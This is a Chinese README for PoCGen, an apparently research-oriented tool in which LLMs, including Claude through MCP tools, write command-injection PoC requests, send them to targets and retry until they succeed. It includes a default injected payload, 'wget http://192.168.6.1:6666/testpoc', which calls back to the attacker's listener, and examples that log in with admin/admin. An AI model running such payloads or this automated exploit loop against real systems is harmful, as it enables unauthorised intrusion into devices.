# PoCGen：基于大模型的 PoC 生成器

PoCGen 将"漏洞描述 + 相关代码片段"转化为可直接落盘的原始 HTTP/Socket.IO PoC，支持 CVE 信息自动爬取、二进制漏洞分析（IDA MCP）、CDP 浏览器采样、自动验证与多轮自修正，默认聚焦命令注入场景。

## 亮点
- **CVE 情报自动爬取**：`--CVENumber` 自动从 NVD 镜像（fkie-cad）拉取漏洞信息，爬取关联参考链接中的描述与 PoC，整合后注入提示词辅助生成。
- **IDA MCP 二进制分析**：`--binary` + `--ida-mcp-url` 调用远程 IDA Pro 反编译漏洞函数，将 sink/source/调用链分析结果注入提示词。
- **CDP 浏览器采样**：`--probe-target` + `--browser-login` 通过 Chrome DevTools Protocol 采集中包含登录流程的页面，LLM 辅助识别登录字段，抓取样本请求与 Cookie。
- **一键生成**：读取描述与代码文本，输出原始 `.http` 报文或 Socket.IO 事件 JSON。
- **多轮自修正**：支持"采样 → 生成 → 自动验证 → 回调监控"循环，按反馈修正请求直至成功或达最大轮次。
- **Socket 事件**：`command_injection_socket` handler 输出合法的 Socket.IO 事件 JSON，并自动发包验证。
- **MCP 工具集**：15 个 MCP 工具供 Claude Code 直接调用，实现 LLM 主导的 PoC 开发流程。
- **可扩展**：处理器（Handler）机制分离漏洞类型与提示词。

## 快速上手

```bash
# 安装主环境（Python 3.11，创建 .venv）
cd PoCGen
./setup_env.sh

# 如需二进制分析，接入 IDA Pro
./setup_env.sh --with-ida --ida-home /home/li/ida9.1

# 激活环境
source .venv/bin/activate

# 最小示例（仅 HTTP PoC 生成）
python -m PoCGen.cli --desc desc.txt --code src/*.c

# 带 CVE 情报爬取
python -m PoCGen.cli --desc desc.txt --code src/*.c --CVENumber CVE-2025-9149

# CDP 浏览器采样 + 登录 + 自动验证
python -m PoCGen.cli --desc desc.txt --code src/*.c \
  --target http://192.168.6.2 \
  --probe-target --browser-login \
  --login-username admin --login-password admin \
  --auto-validate --max-iters 5

# Socket.IO 事件 PoC
python -m PoCGen.cli --desc desc.txt --code src/*.c \
  --target ws://192.168.6.2:3000/socket.io/?EIO=4&transport=websocket \
  --vuln-type command_injection_socket --auto-validate
```

## 完整测试命令

```bash
python3 -m PoCGen.cli \
  --desc /path/to/desc.txt \
  --code "/path/to/src/*.c" \
  --target http://192.168.6.2 \
  --CVENumber CVE-2025-9149 \
  --binary /path/to/firmware.cgi \
  --ida-mcp-url http://127.0.0.1:8745/mcp \
  --probe-target --browser-login \
  --login-url http://192.168.6.2 \
  --login-username admin --login-password admin \
  --auto-validate --max-iters 5 \
  --payload "wget http://192.168.6.1:6666/testpoc"
```

## 架构

### MCP 工作流（Claude 主导）

```
1. pocgen_read_code("./desc.txt", "./src/*.c")     → 读取漏洞描述和源码
2. pocgen_cve_intelligence("CVE-2025-9149")         → 爬取 CVE 情报
3. pocgen_sample_target("http://192.168.6.2")       → CDP 浏览器探测目标
4. pocgen_load_device_profile("TotolinkA3300R")     → 加载已知设备模式（可选）
5. (Claude 自己分析漏洞，理解注入点)                   → Claude 的核心价值
6. (Claude 自己生成 PoC HTTP 请求)                    → 基于理解，不是猜
7. pocgen_parse_http(raw_request)                   → 验证格式
8. pocgen_validate_http(requests, target)           → 重放到目标验证
9. pocgen_monitor_start() + pocgen_monitor_wait()   → 监听 wget 回调
10. pocgen_save_poc(raw_request)                    → 保存到磁盘
11. pocgen_save_device_profile(...)                  → 缓存设备模式（首次验证后）
12. pocgen_batch_validate("./pocs_saved/", target)  → 批量验证所有 PoC
13. 失败? Claude 分析原因，调整策略，重试              → 比弱 LLM 反馈循环更强
```

### MCP 工具（15 个）

| 工具 | 用途 |
|---|---|
| `pocgen_cve_intelligence` | 爬取 NVD + 参考链接 |
| `pocgen_sample_target` | CDP 浏览器探测（LLM 辅助字段分析） |
| `pocgen_read_code` | 读取源码文件 |
| `pocgen_parse_http` | 解析 HTTP 请求格式 |
| `pocgen_parse_socket` | 解析 Socket.IO 事件 |
| `pocgen_validate_http` | 重放 HTTP 请求验证 |
| `pocgen_validate_socket` | 分发 Socket.IO 事件验证 |
| `pocgen_monitor_start` | 启动 wget 回调监听 |
| `pocgen_monitor_wait` | 等待回调 |
| `pocgen_monitor_stop` | 停止回调 |
| `pocgen_save_poc` | 保存 PoC 到磁盘 |
| `pocgen_batch_validate` | 批量验证目录下所有 PoC |
| `pocgen_save_device_profile` | 保存设备 profile |
| `pocgen_load_device_profile` | 加载已保存的设备 profile |
| `pocgen_list_device_profiles` | 列出所有设备 profiles |

### 目录速览

- `config/`：配置加载（环境变量 + `.env`）。
- `llm/`：OpenAI SDK 封装，支持多提供商（GLM/DeepSeek/Qwen）。
- `prompts/`：提示词模板与拼装函数。
- `core/`：主流程与核心模块。
  - `core/sampler.py`：浏览器采样入口（委托给 cdp_sampler）。
  - `core/cdp_sampler.py`：Chrome DevTools Protocol 浏览器自动化，LLM 辅助登录字段分析。
  - `core/login_flow.py`：登录流程（LLM 字段选择、按钮识别）。
  - `core/vuln_analyzer.py`：二进制漏洞分析（源码 + IDA MCP）。
  - `core/attacker_monitor.py`：wget 回调监控 HTTP 服务器。
  - `core/command_injection/`：HTTP/Socket.IO PoC 解析、验证、保存。
- `mcp_tools/`：MCP 工具注册（intelligence, validation, monitor, utility）。
- `tools/getWeb.py`：CVE 情报爬取（NVD 镜像 + 参考链接爬虫 + LLM 整合）。
- `cli.py`：命令行入口。
- `output/`：输出根目录。
  - `poc/`：HTTP PoC 报文。
  - `socket/`：Socket.IO 事件 PoC。
  - `cve_cache/`：CVE 情报缓存。
  - `cookie/`：浏览器采样 Cookie。
  - `http_post_sample/`：POST 请求样本。

### 工作流程图

```
                    ┌─────────────────────┐
                    │   CLI 输入参数       │
                    │  desc / code / CVE   │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
       CVE 情报爬取      二进制漏洞分析      CDP 浏览器采样
     (getWeb.py)      (vuln_analyzer)    (cdp_sampler.py)
     info/reason/webpoc  sink/source/路径   请求样本/Cookie
              │                │                │
              └────────────────┼────────────────┘
                               ▼
                    提示词拼装 (prompts/)
                    system + user 消息
                               │
                               ▼
                       LLM 生成 PoC
                               │
                    ┌──────────┴──────────┐
                    ▼                     ▼
              HTTP .http            Socket .json
                    │                     │
                    └──────────┬──────────┘
                               ▼
                    自动验证 + 回调监控
                    (remote_validator +
                     attacker_monitor)
                               │
                          反馈修正循环
                    (max-iters 轮次)
```

## 配置（环境变量）

通过 `.env` 文件或环境变量配置，项目根目录放置 `.env` 即可自动加载。

### LLM 提供商配置

| 变量 | 说明 |
| --- | --- |
| `POCGEN_<PROVIDER>_BASE_URL` | 提供商 API 地址（OpenAI 兼容格式） |
| `POCGEN_<PROVIDER>_API_KEY` | 提供商 API Key |
| `POCGEN_<PROVIDER>_MODEL` | 提供商模型名称 |
| `POCGEN_DEFAULT_PROVIDER` | 默认模型提供商（如 `glm`、`deepseek`） |

内置提供商为 `glm`、`deepseek`，对应环境变量前缀为 `POCGEN_GLM_`、`POCGEN_DS_`。

### 通用配置

| 变量 | 说明 | 默认 |
| --- | --- | --- |
| `POCGEN_TIMEOUT` | LLM 请求超时（秒） | 120 |
| `POCGEN_OUTPUT_ROOT` | 输出根目录 | `PoCGen/output` |
| `POCGEN_VULN_TYPE` | 漏洞类型 key | command_injection_http |
| `POCGEN_PAYLOAD` | 攻击 payload | `wget http://192.168.6.1:6666/testpoc` |
| `POCGEN_MAX_ITERS` | 最大迭代轮次 | 1 |
| `POCGEN_STOP_ON_SUCCESS` | 回调成功后是否提前停止 | true |
| `POCGEN_MONITOR_TIMEOUT` | 每轮等待回调秒数 | 10 |
| `POCGEN_BROWSER_HEADLESS` | Chrome 无头模式 | true |
| `POCGEN_CDP_PORT` | Chrome 远程调试端口 | 9222 |
| `POCGEN_CDP_CHROME` | Chrome 二进制路径 | 系统 PATH 中的 Chrome |

## CLI 参数

| 参数 | 说明 |
| --- | --- |
| `--desc` | 漏洞描述文件路径 |
| `--code` | 相关源代码文件（支持 glob） |
| `--target` | 目标 URL |
| `--CVENumber` | CVE 编号，自动爬取漏洞情报 |
| `--binary` | 漏洞二进制文件路径（配合 IDA MCP） |
| `--vuln-type` | 漏洞类型（`command_injection_http` / `command_injection_socket`） |
| `--payload` | 攻击 payload |
| `--probe-target` | CDP 浏览器采样目标页面 |
| `--browser-login` | 使用 CDP 浏览器登录获取 Cookie |
| `--login-url` | 登录页 URL |
| `--login-username` / `--login-password` | 登录凭证 |
| `--login-user-field` / `--login-pass-field` | 登录表单字段名 |
| `--auto-validate` | 生成后自动发送验证 |
| `--max-iters` | 最大迭代轮次 |
| `--stop-on-success` / `--no-stop-on-success` | 回调成功后是否停止 |

## 扩展新漏洞类型

1. 在 `prompts/` 添加对应提示词函数。
2. 在 `core/` 下新建 handler 目录，继承 `VulnHandler`。
3. 在 `core/generator.py` 的 `HANDLERS` 注册。
4. 通过 `--vuln-type` 或 `POCGEN_VULN_TYPE` 选择。

## 注意

- 工具生成 PoC 但不会在未开启 `--auto-validate` 时主动发包；请确保使用场景获得授权。
- CVE 爬虫需要网络访问 fkie-cad GitHub 镜像和 NVD API，如在国内需配置 `https_proxy`。
- IDA MCP 依赖远程 IDA Pro 服务，需提前启动。
- 浏览器采样需要 Chrome/Chromium，首次运行会自动启动 headless Chrome。
